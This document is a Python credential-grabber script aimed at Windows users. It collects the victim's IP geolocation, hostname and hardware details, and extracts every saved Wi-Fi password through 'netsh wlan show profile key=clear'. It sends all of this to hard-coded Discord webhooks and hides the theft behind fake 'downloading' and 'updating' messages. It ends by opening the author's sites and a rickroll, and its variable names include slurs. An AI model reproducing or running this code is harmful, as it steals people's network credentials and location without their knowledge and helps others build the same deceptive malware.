import io , subprocess as rip , requests as pp, os as op , webbrowser as p1, socket as poggchamp, platform as halal, wmi
from dhooks import Webhook, File
op.system("color 0a") 
fname = "holyshit.txt" 
whobedum = poggchamp.gethostname() 
mynigga = halal.uname() 
windowsop = wmi.WMI() 
macsuxs = windowsop.Win32_ComputerSystem()[0] 
Wbhook_wifi = Webhook("https://discord.com/api/webhooks/880554721922916402/1OL1oEL7pLryhFkGrCl7lNR5xethn5gms8JlEpRHbM-kVQwwutuZ7F00aq-a43pJcSHz")
Wbhook_nowifi = Webhook("https://discord.com/api/webhooks/880554730462535751/TVU-jyTKMLkqE3BqXBE3xHMvEMRj-iX-5TXVaYkxfzYMYxrHkRh8kQn_tcjupCaKk9JU")
Wbhook_ip = Webhook("https://discord.com/api/webhooks/880516595670192208/7H7vG-feqnASTWD8VyZzv2uBHo1y3zJ8dtANpVW6e1qcUcAgvmmuoduf9EGarg00nKk7") 
x = pp.get("http://ip-api.com/json") 
data = str(x.json()) 
print("Downloading Modules")
with io.open(fname, 'w', encoding="utf-8") as pog:
    pog.write(data) 
Wbhook_ip.send(f'''
**--------------------------GRABBED_INFO-----------------------------**
Hello There Young Lad,\nThis is Hecker From Dark Web.\nLmao just take the ip and get lost baibai.\n@everyone\nhttps://github.com/abhinav-ranish\nhttps://abhinavranish.gq
-------------------------------------------------------------------
AbhiQ Grabber =
```yaml
---------------------------Precise Info---------------------------
{data}
---------------------------------------------------------------------
```
Hostname = {whobedum}
---------------------------------------------------------------------
**---------------------------System Info-----------------------------**
System = {mynigga.system}\nNode Name = {mynigga.node}\nRelease = {mynigga.release}\nMachine = {mynigga.machine}\nProcessor = {mynigga.processor}\nVersion = {mynigga.version}
-------------------------------------------------------------------
**----------------------------Windows PC----------------------------**
Manufacturer = {macsuxs.Manufacturer}\nModel = {macsuxs. Model}\nName = {macsuxs.Name}\nNumberOfProcessors = {macsuxs.NumberOfProcessors}\nSystemType = {macsuxs.SystemType}\nSystemFamily = {macsuxs.SystemFamily}
-------------------------------------------------------------------
CC@ https://github.com/abhinav-ranish
-------------------------------------------------------------------
''')
Wbhook_nowifi.send(f"**Hostname = {whobedum}**")
Wbhook_wifi.send(f"**Node Name = {mynigga.node}**  **Name = {macsuxs.Name}** ")
print("downloading python==1.39 -------------------/------------") 
data = rip.check_output(['netsh', 'wlan', 'show', 'profile']).decode('utf-8').split('\n') 
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = rip.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n') 
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b ]
    try:
        Wbhook_wifi.send ("{:<30}|   {:<}".format(i,results[0])) 
    except IndexError:
        Wbhook_nowifi.send ("{:<30}|   {:<}".format(i, "")) 
    except:
        print("Errors Found") 
print("Checking For Updates") 
print("Scanning....") #more fake shit
print("Enjoy Life Beta.") #enjoy ur life beta
input("Enter To See Results!") #rickrolls the person when click any button
p1.open_new_tab("https://abhinavranish.gq")#my website
p1.open_new_tab("https://github.com/abhinav-ranish")#my github
p1.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")#rickroll link
print("Noob Gamer Get Rolled. For More Visit abhinaranish.gq")#fake shit


